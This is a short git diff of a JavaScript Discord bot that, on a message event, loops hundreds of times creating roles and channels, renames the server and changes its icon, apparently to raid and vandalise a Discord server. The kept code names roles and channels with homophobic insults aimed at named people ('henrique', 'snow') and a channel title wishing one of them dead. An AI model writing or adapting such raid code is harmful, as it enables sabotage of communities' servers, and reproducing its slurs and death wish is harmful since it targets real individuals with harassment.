@@ -28,14 +28,6 @@ client.on("message", async (message) => {
        message.guild.setIcon('./icon.png') 
 	message.channel.send(`henrique bixa`)
 	for(i = 0; i < 499; i++)
-		/*
-        	message.guild.createRole('NOOT NOOT')
-	    	message.guild.setName(process.env.SERVER_NAME + `${textuh}`)
-	    	const textuh = makeid(32);
-	    	message.guild.createChannel(`${textuh}`, 'text');
-	    	message.guild.createChannel(`${textuh}`, 'voice');  
-	    	message.guild.setIcon('./icon.png') 
-		*/
 		message.guild.createRole('henry gay')
 	    	message.guild.setName('snow manipulador do caralho')
 	    	message.guild.createChannel('SNOW ESPERO QUE VOCE MORRA -SUZY <3');
